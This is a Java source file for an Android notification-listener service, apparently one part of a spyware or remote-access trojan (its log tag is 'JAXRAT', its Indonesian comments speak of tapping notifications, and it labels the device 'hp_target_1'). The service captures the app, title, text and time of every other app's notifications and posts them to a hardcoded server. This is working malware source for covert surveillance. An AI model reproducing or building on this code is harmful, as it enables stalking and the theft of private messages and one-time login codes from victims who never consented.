package com.ezax.agent;

import android.app.Notification;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class NotificationService extends NotificationListenerService {

    // SESUAIKAN IP INI DENGAN IP LAPTOP KAMU SEKARANG
    private static final String SERVER_URL = "http://192.168.1.20:5000/api/upload_notification/hp_target_1";

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        // Jangan sadap notifikasi dari aplikasi kita sendiri
        if (sbn.getPackageName().equals(getPackageName())) return;

        Bundle extras = sbn.getNotification().extras;
        if (extras == null) return;

        String appName = sbn.getPackageName();
        String title = extras.getString(Notification.EXTRA_TITLE, "Tanpa Judul");
        CharSequence textChar = extras.getCharSequence(Notification.EXTRA_TEXT);
        String text = textChar != null ? textChar.toString() : "Tanpa Pesan";

        String time = new SimpleDateFormat("HH:mm", Locale.getDefault()).format(new Date(sbn.getPostTime()));

        kirimKeWeb(appName, title, text, time);
    }

    private void kirimKeWeb(String app, String title, String text, String time) {
        new Thread(() -> {
            try {
                URL url = new URL(SERVER_URL);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                JSONObject json = new JSONObject();
                json.put("app", app);
                json.put("title", title);
                json.put("text", text);
                json.put("time", time);

                try (OutputStream os = conn.getOutputStream()) {
                    os.write(json.toString().getBytes("utf-8"));
                }
                conn.getResponseCode();
            } catch (Exception e) {
                Log.e("JAXRAT", "Gagal kirim notif", e);
            }
        }).start();
    }
}
